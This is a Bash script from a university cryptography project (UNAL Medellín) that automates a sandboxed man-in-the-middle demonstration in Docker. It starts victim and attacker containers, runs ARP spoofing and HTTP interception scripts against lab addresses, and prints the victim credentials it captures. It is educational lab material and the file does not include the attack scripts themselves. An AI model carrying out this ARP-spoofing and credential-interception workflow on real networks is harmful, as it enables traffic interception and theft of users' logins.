#!/bin/bash

# ============================================
# Script Maestro de Demostración MitM
# Proyecto de Criptografía - UNAL Medellín
# ============================================

set -e

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${CYAN}"
cat << "EOF"
╔════════════════════════════════════════════════════════════╗
║     Man-in-the-Middle Attack Demonstration                 ║
║     Universidad Nacional de Colombia - Sede Medellín       ║
║     Criptografía y Seguridad - Grupo 6                     ║
╚════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo -e "${RED}⚠️  ADVERTENCIA: USO EDUCATIVO ÚNICAMENTE${NC}"
echo -e "${YELLOW}Este script ejecuta un ataque MitM en un entorno controlado.${NC}"
echo ""

# Verificar que estamos en el directorio correcto
if [ ! -f "mitm-demo/docker-compose.yml" ]; then
    echo -e "${RED}❌ Error: Ejecuta este script desde el directorio raíz del proyecto${NC}"
    exit 1
fi

cd mitm-demo

echo -e "${BLUE}📋 Verificando Docker...${NC}"
if ! docker compose version &> /dev/null; then
    echo -e "${RED}❌ Docker Compose no está instalado${NC}"
    exit 1
fi
echo -e "${GREEN}✅ Docker Compose disponible${NC}"
echo ""

# Función para esperar
wait_for_service() {
    local service=$1
    local max_attempts=30
    local attempt=0
    
    echo -e "${BLUE}⏳ Esperando a que $service esté listo...${NC}"
    
    while [ $attempt -lt $max_attempts ]; do
        if docker compose ps | grep -q "$service.*running"; then
            echo -e "${GREEN}✅ $service está listo${NC}"
            return 0
        fi
        attempt=$((attempt + 1))
        sleep 1
    done
    
    echo -e "${RED}❌ Timeout esperando a $service${NC}"
    return 1
}

# Menú de opciones
echo -e "${CYAN}Selecciona una opción:${NC}"
echo "1. Demo completa automatizada (recomendado)"
echo "2. Demo paso a paso (manual)"
echo "3. Solo levantar el entorno"
echo "4. Detener y limpiar"
echo ""
read -p "Opción [1-4]: " option

case $option in
    1)
        echo -e "\n${GREEN}🚀 Iniciando demo completa automatizada...${NC}\n"
        
        # Paso 1: Levantar contenedores
        echo -e "${BLUE}📦 Paso 1/6: Levantando contenedores Docker...${NC}"
        docker compose up -d
        echo ""
        
        # Esperar a que los servicios estén listos
        wait_for_service "webserver"
        wait_for_service "victim"
        wait_for_service "attacker"
        echo ""
        
        # Paso 2: Verificar conectividad
        echo -e "${BLUE}🔍 Paso 2/6: Verificando conectividad...${NC}"
        docker compose exec -T victim ping -c 2 172.20.0.30 > /dev/null 2>&1
        echo -e "${GREEN}✅ Conectividad verificada${NC}"
        echo ""
        
        # Paso 3: Mostrar estado inicial
        echo -e "${BLUE}📊 Paso 3/6: Estado inicial de la red${NC}"
        echo -e "${CYAN}Tabla ARP de la víctima (antes del ataque):${NC}"
        docker compose exec -T victim arp -a
        echo ""
        
        # Paso 4: Iniciar ARP spoofing en background
        echo -e "${BLUE}🎯 Paso 4/6: Iniciando ARP spoofing...${NC}"
        docker compose exec -d attacker python3 /scripts/arp_spoof.py \
            --victim 172.20.0.10 \
            --gateway 172.20.0.1 \
            --interface eth0
        
        echo -e "${GREEN}✅ ARP spoofing iniciado${NC}"
        sleep 3
        echo ""
        
        # Paso 5: Iniciar interceptación HTTP en background
        echo -e "${BLUE}🕵️  Paso 5/6: Iniciando interceptación HTTP...${NC}"
        docker compose exec -d attacker python3 /scripts/intercept_http.py \
            --interface eth0 \
            --log /logs/intercepted_credentials.txt
        
        echo -e "${GREEN}✅ Interceptación HTTP iniciada${NC}"
        sleep 2
        echo ""
        
        # Paso 6: Víctima navega y envía credenciales
        echo -e "${BLUE}👤 Paso 6/6: Víctima navegando y enviando credenciales...${NC}"
        echo -e "${YELLOW}(La víctima no sabe que está siendo interceptada)${NC}"
        echo ""
        
        docker compose exec -T victim python3 /scripts/browse_http.py
        echo ""
        
        # Esperar un poco para que se capture todo
        sleep 3
        
        # Mostrar resultados
        echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
        echo -e "${RED}🔓 CREDENCIALES INTERCEPTADAS:${NC}"
        echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
        
        if docker compose exec -T attacker test -f /logs/intercepted_credentials.txt; then
            docker compose exec -T attacker cat /logs/intercepted_credentials.txt
        else
            echo -e "${YELLOW}⚠️  Archivo de credenciales aún no creado${NC}"
        fi
        
        echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
        echo ""
        
        # Mostrar tabla ARP modificada
        echo -e "${BLUE}📊 Tabla ARP de la víctima (después del ataque):${NC}"
        docker compose exec -T victim arp -a
        echo ""
        
        # Resumen
        echo -e "${GREEN}✅ Demo completada exitosamente!${NC}"
        echo ""
        echo -e "${CYAN}📋 Resumen:${NC}"
        echo "  1. ✅ ARP spoofing ejecutado"
        echo "  2. ✅ Tráfico HTTP interceptado"
        echo "  3. ✅ Credenciales capturadas"
        echo ""
        echo -e "${BLUE}📁 Archivos generados:${NC}"
        echo "  - Logs: ../evidencias/logs/intercepted_credentials.txt"
        echo "  - Capturas: ../evidencias/pcap_files/"
        echo ""
        echo -e "${YELLOW}Para ver los logs en tiempo real:${NC}"
        echo "  docker compose logs -f attacker"
        echo ""
        echo -e "${YELLOW}Para detener la demo:${NC}"
        echo "  docker compose down"
        echo ""
        ;;
        
    2)
        echo -e "\n${GREEN}🚀 Modo paso a paso...${NC}\n"
        
        echo -e "${BLUE}📦 Levantando contenedores...${NC}"
        docker compose up -d
        echo ""
        
        wait_for_service "webserver"
        wait_for_service "victim"
        wait_for_service "attacker"
        echo ""
        
        echo -e "${GREEN}✅ Entorno listo${NC}"
        echo ""
        echo -e "${CYAN}Sigue estos pasos en terminales separadas:${NC}"
        echo ""
        echo -e "${YELLOW}Terminal 1 - ARP Spoofing:${NC}"
        echo "  cd mitm-demo"
        echo "  docker compose exec attacker python3 /scripts/arp_spoof.py \\"
        echo "      --victim 172.20.0.10 --gateway 172.20.0.1"
        echo ""
        echo -e "${YELLOW}Terminal 2 - Interceptación HTTP:${NC}"
        echo "  cd mitm-demo"
        echo "  docker compose exec attacker python3 /scripts/intercept_http.py"
        echo ""
        echo -e "${YELLOW}Terminal 3 - Víctima navega:${NC}"
        echo "  cd mitm-demo"
        echo "  docker compose exec victim python3 /scripts/browse_http.py"
        echo ""
        echo -e "${YELLOW}Para ver credenciales interceptadas:${NC}"
        echo "  docker compose exec attacker cat /logs/intercepted_credentials.txt"
        echo ""
        ;;
        
    3)
        echo -e "\n${GREEN}🚀 Levantando entorno...${NC}\n"
        docker compose up -d
        echo ""
        docker compose ps
        echo ""
        echo -e "${GREEN}✅ Entorno levantado${NC}"
        echo ""
        echo -e "${BLUE}Accede al servidor web:${NC}"
        echo "  http://localhost:8080"
        echo ""
        ;;
        
    4)
        echo -e "\n${YELLOW}🧹 Deteniendo y limpiando...${NC}\n"
        docker compose down
        echo ""
        echo -e "${GREEN}✅ Entorno detenido${NC}"
        echo ""
        read -p "¿Eliminar también los logs y capturas? (y/N): " clean_logs
        if [[ "$clean_logs" =~ ^[Yy]$ ]]; then
            rm -f ../evidencias/logs/*.txt
            rm -f ../evidencias/pcap_files/*.pcap
            echo -e "${GREEN}✅ Logs y capturas eliminados${NC}"
        fi
        ;;
        
    *)
        echo -e "${RED}❌ Opción inválida${NC}"
        exit 1
        ;;
esac

echo ""
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}Gracias por usar la demo de MitM${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
